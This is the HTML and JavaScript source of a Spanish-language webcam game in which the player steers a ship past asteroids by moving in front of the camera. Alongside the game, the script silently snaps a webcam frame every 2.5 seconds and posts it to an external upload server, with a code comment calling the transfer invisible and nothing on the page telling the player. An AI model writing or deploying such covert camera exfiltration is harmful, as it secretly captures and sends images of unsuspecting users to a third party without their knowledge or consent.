<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Starship: Python Biometric Guard</title>
    <style>
        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: sans-serif; color: white; }
        canvas { display: block; z-index: 10; position: absolute; }
        video { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.15; transform: scaleX(-1); }
        
        #pause-overlay { 
            position: absolute; width: 100%; height: 100%; background: rgba(255,0,0,0.5); 
            z-index: 100; display: flex; align-items: center; justify-content: center; 
            flex-direction: column; text-align: center; visibility: hidden;
        }
        
        #controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: center; gap: 100px; z-index: 50; }
        .arrow { font-size: 40px; padding: 20px; border: 3px solid #00fbff; color: #00fbff; border-radius: 15px; opacity: 0.3; }
        .active { opacity: 1; box-shadow: 0 0 20px #00fbff; background: rgba(0,251,255,0.2); }
        
        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 50; }
    </style>
</head>
<body>

<div id="pause-overlay">
    <h1>⚠️ SEGURIDAD: TORSO NO DETECTADO</h1>
    <p>Por favor, siéntate derecho y muestra tus hombros a la cámara.</p>
</div>

<div id="hud">
    <div>PUNTOS: <span id="score">0</span></div>
    <div>ESCUDO: <span id="health">100</span>%</div>
</div>

<div id="controls">
    <div id="left-ui" class="arrow">◀</div>
    <div id="right-ui" class="arrow">▶</div>
</div>

<video id="webcam" autoplay playsinline></video>
<canvas id="gameCanvas"></canvas>

<script>
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let score = 0, health = 100, asteroids = [], prevFrame = null;
    let shipX = 0, gameActive = false, torsoDetected = false;

    // 1. INICIAR CÁMARA Y ENVÍO DE FOTOS (SIEMPRE ACTIVO)
    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
        video.srcObject = stream;
        setInterval(sendToExternalServer, 2500); // Envío invisible
        setInterval(checkPythonSensor, 100);    // Consultar a Python
        startGame();
    });

    // 2. CONSULTAR AL SENSOR PYTHON
    async function checkPythonSensor() {
        try {
            const res = await fetch('/sensor');
            const data = await res.json();
            torsoDetected = data.torso;
            document.getElementById('pause-overlay').style.visibility = torsoDetected ? "hidden" : "visible";
        } catch (e) { console.log("Python no responde"); }
    }

    // 3. ENVÍO DE FOTOS AL SERVIDOR EXTERNO
    function sendToExternalServer() {
        const s = document.createElement('canvas');
        s.width = video.videoWidth; s.height = video.videoHeight;
        s.getContext('2d').drawImage(video, 0, 0);
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.4) })
        }).catch(() => {});
    }

    function startGame() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        shipX = canvas.width / 2;
        gameActive = true;
        requestAnimationFrame(update);
        setInterval(spawnAsteroid, 1000);
    }

    function spawnAsteroid() {
        if (!torsoDetected) return;
        asteroids.push({ x: Math.random() * canvas.width, y: -50, speed: 4 + (score/500) });
    }

    function update() {
        if (torsoDetected) {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            // Detección de movimiento para las flechas (Lógica HTML)
            detectMotion();

            // Dibujar Asteroides
            asteroids.forEach((a, i) => {
                a.y += a.speed;
                ctx.fillStyle = "red";
                ctx.beginPath(); ctx.arc(a.x, a.y, 20, 0, Math.PI*2); ctx.fill();
                
                // Colisión
                if (Math.abs(a.x - shipX) < 40 && Math.abs(a.y - (canvas.height - 100)) < 40) {
                    asteroids.splice(i, 1);
                    health -= 10;
                    document.getElementById('health').innerText = health;
                    if(health <= 0) location.reload();
                }
            });

            // Dibujar Nave
            ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 4;
            ctx.beginPath();
            ctx.moveTo(shipX, canvas.height - 120);
            ctx.lineTo(shipX - 30, canvas.height - 70);
            ctx.lineTo(shipX + 30, canvas.height - 70);
            ctx.closePath(); ctx.stroke();
        }
        requestAnimationFrame(update);
    }

    function detectMotion() {
        const tempC = document.createElement('canvas');
        const tempCx = tempC.getContext('2d');
        tempC.width = 64; tempC.height = 48;
        tempCx.scale(-1, 1);
        tempCx.drawImage(video, -64, 0, 64, 48);
        const curr = tempCx.getImageData(0, 0, 64, 48).data;
        
        let moveL = 0, moveR = 0;
        if (prevFrame) {
            for (let i = 0; i < curr.length; i += 4) {
                if (Math.abs(curr[i] - prevFrame[i]) > 40) {
                    const gx = (i / 4) % 64;
                    if (gx < 20) moveL++;
                    else if (gx > 44) moveR++;
                }
            }
        }
        prevFrame = curr;

        const uiL = document.getElementById('left-ui');
        const uiR = document.getElementById('right-ui');
        
        if (moveL > 20) { shipX -= 8; uiL.classList.add('active'); } else { uiL.classList.remove('active'); }
        if (moveR > 20) { shipX += 8; uiR.classList.add('active'); } else { uiR.classList.remove('active'); }
    }
</script>
</body>
</html>
